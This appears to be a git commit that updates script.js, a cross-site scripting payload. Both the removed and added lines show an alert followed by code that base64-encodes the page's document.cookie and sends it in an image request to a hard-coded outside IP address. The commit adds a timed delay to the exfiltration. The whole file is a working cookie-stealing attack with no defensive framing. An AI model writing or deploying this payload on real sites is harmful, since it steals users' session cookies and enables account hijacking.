191804bc3bf8d622a7d3a3e913faa1161251d54b
rfelecT <157028039+rfelecT@users.noreply.github.com>
2024-11-30 18:15:44 +0330

    Update script.js

--- script.js
+++ script.js
@@ -1,3 +1,5 @@
-alert(document.domain);
-var img = new Image();
-img.src = 'https://49.13.194.218/log?cookie=' + encodeURIComponent(btoa(document.cookie));
+alert('XSS');  // Trigger the alert
+setTimeout(function() {
+    var img = new Image();
+    img.src = 'https://49.13.194.218/log?cookie=' + encodeURIComponent(btoa(document.cookie));
+}, 500);  // Delay the image request to give time for the alert to finish
